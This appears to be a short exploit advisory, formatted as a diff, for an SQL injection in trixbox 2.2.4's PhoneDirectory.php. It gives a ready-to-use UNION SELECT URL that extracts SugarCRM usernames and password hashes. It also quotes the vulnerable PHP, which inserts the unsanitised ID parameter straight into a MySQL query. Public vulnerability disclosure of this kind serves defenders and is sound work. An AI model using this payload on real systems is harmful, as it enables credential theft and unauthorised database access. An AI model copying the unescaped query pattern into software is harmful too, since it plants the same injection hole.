@@ -1,0 +1,26 @@
+# Software Link: http://trixbox.org/downloads
+# Version: 2.2.4
+# Code : 
+http://server/cisco/services/PhoneDirectory.php?ID=1 [SQL INJECTION]
+
+Example (Grab users / password hashes from sugarcrm) 
+http://server/cisco/services/PhoneDirectory.php?ID=1' UNION SELECT id,user_hash AS 'first_name',last_name,phone_home,user_name AS 'phone_work',user_hash AS 'phone_mobile',phone_other FROM users WHERE 1='1' GROUP BY 'id
+
+
+PhoneDirectory.php vulnerable code:
+# If the variable "ID" is passed in through the GET string, then display
+# extension, phone number and cell phone number for that record with the dial
+# key functionality
+if ($ID) {
+ $PersonDirectoryListing = "<CiscoIPPhoneDirectory>\n";
+
+ $Query = "SELECT id, first_name, last_name, phone_home, phone_work, phone_mobile, phone_other ";
+ $Query .= "FROM contacts WHERE id = '$ID' ";
+ $Query .= "ORDER BY last_name ";
+ $SelectPersonInfo = mysql_query($Query,$ConnectionSuccess);
+
+ ...
+
+}
+
+#norslacker [at] gmail [dot] com
